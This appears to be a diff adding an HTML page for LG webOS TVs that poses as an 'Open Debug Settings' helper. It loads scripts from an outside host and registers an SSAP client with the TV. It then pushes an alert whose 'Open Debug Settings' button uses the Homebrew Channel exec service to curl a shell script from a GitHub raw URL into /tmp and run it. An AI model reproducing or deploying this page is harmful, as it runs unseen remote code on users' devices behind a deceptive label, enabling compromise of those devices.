@@ -1,0 +1,77 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Open Debug (SSAP)</title>
+  <style>
+    body { background:#0b0b0b; color:#eee; font-family:Arial,sans-serif; padding:24px; text-align:center }
+    button { padding:12px 18px; border-radius:10px; border:1px solid #444; background:#222; color:#fff; cursor:pointer }
+    #log { margin-top:16px; white-space:pre-wrap; text-align:left; max-width:900px; margin-left:auto; margin-right:auto; color:#ccc; background:#0f0f0f; padding:10px; border-radius:8px; border:1px solid #222 }
+  </style>
+</head>
+<body>
+  <h2>Press Enter → Open Debug Settings</h2>
+  <button id="go">Open Debug Settings (Enter)</button>
+  <div id="log"></div>
+
+  <!-- SSAP helper libs -->
+  <script src="https://dropbox.inf.re/webos-gfn/wsproxy.js"></script>
+  <script src="https://dropbox.inf.re/webos-gfn/client.js"></script>
+
+  <script>
+    const LOG = document.getElementById('log');
+    function log(...s){ LOG.textContent = '[' + new Date().toLocaleTimeString() + '] ' + s.join(' ') + '\n' + LOG.textContent; }
+
+    async function initClient(){
+      const target = '127.0.0.1';
+      log('Connecting to ' + target + '...');
+      window.ssapClient = new SSAPClient(target, window.localStorage['client-key-' + target]);
+      await ssapClient.connect();
+      log('Connected, registering...');
+      window.localStorage['client-key-' + target] = await ssapClient.register();
+      log('Registered (client-key saved).');
+    }
+
+    function buildPayload(){
+      const gitUrl = "https://raw.githubusercontent.com/itsRealM12C/wal/refs/heads/main/ds.sh";
+      const runCmd = "curl -L -o /tmp/ds.sh " + gitUrl + " && /bin/sh /tmp/ds.sh";
+
+      return {
+        title: 'Debug Tools',
+        message: 'Press the button to open Debug Settings',
+        buttons: [
+          {
+            label: 'Show Toast',
+            onclick: 'luna://com.webos.notification/createToast',
+            params: { message: 'Test toast from web app' }
+          },
+          {
+            label: 'Open Debug Settings',
+            onclick: 'luna://org.webosbrew.hbchannel.service/exec',
+            params: { command: runCmd }
+          }
+        ]
+      };
+    }
+
+    async function sendAlert(){
+      try{
+        if(!window.ssapClient) await initClient();
+        const payload = buildPayload();
+        log('Sending createAlert payload via ssap://...');
+        await ssapClient.request({ uri: 'ssap://com.webos.notification/createAlert', payload });
+        log('Alert request sent.');
+      }catch(e){
+        log('Failed: ' + e);
+      }
+    }
+
+    document.getElementById('go').addEventListener('click', sendAlert);
+    window.addEventListener('keydown', (ev) => {
+      if(ev.key === 'Enter') { ev.preventDefault(); sendAlert(); }
+    });
+
+    (async () => { try { await initClient(); } catch(e) { log('Auto-init failed. Press button.'); } })();
+  </script>
+</body>
+</html>
